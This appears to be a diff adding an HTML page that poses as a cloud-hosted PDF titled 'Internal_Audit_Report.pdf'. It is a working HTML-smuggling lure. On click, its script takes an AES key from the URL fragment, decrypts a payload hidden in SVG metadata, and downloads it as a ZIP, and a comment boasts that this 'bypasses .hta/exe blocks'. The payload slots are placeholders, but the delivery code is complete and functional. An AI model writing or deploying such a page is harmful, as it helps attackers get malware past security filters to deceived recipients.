@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Document Cloud</title>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fdfdfd; }
+        .icon-container { cursor: pointer; transition: transform 0.2s; }
+        .icon-container:hover { transform: scale(1.05); }
+        .label { margin-top: 10px; color: #555; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+    <div class="icon-container" id="trigger">
+        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M14 2H6C4.89543 2 4 2.89543 4 4V20C4 21.1046 4.89543 22 6 22H18C19.1046 22 20 21.1046 20 20V8L14 2Z" fill="#E2E8F0" stroke="#CBD5E0" stroke-width="2" stroke-linejoin="round"/>
+            <path d="M14 2V8H20" stroke="#CBD5E0" stroke-width="2" stroke-linejoin="round"/>
+            <text x="7" y="18" fill="#E53E3E" font-family="Arial" font-size="6" font-weight="bold">PDF</text>
+            
+            <metadata id="smuggled-data" data-iv="{{IV}}" data-tag="{{TAG}}" data-payload="{{PAYLOAD}}"></metadata>
+        </svg>
+    </div>
+    <div class="label">Internal_Audit_Report.pdf</div>
+
+    <script>
+        document.getElementById('trigger').onclick = async () => {
+            const keyHex = window.location.hash.substring(1);
+            if (!keyHex) return;
+
+            const metadata = document.getElementById('smuggled-data');
+            const data = {
+                content: metadata.getAttribute('data-payload'),
+                iv: metadata.getAttribute('data-iv'),
+                tag: metadata.getAttribute('data-tag')
+            };
+
+            try {
+                const rawKey = new Uint8Array(keyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+                const cryptoKey = await crypto.subtle.importKey("raw", rawKey, "AES-GCM", true, ["decrypt"]);
+                
+                const encrypted = Uint8Array.from(atob(data.content), c => c.charCodeAt(0));
+                const iv = Uint8Array.from(atob(data.iv), c => c.charCodeAt(0));
+                const tag = Uint8Array.from(atob(data.tag), c => c.charCodeAt(0));
+
+                const combined = new Uint8Array(encrypted.length + tag.length);
+                combined.set(encrypted);
+                combined.set(tag, encrypted.length);
+
+                const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv }, cryptoKey, combined);
+                
+                // SMUGGLE AS A ZIP (Bypasses .hta/exe blocks)
+                const url = URL.createObjectURL(new Blob([decrypted], {type: "application/zip"}));
+                const a = document.createElement("a");
+                a.href = url;
+                a.download = "Audit_Report_Protected.zip"; 
+                a.click();
+            } catch (e) {
+                console.log("Session verification failed.");
+            }
+        };
+    </script>
+</body>
+</html>
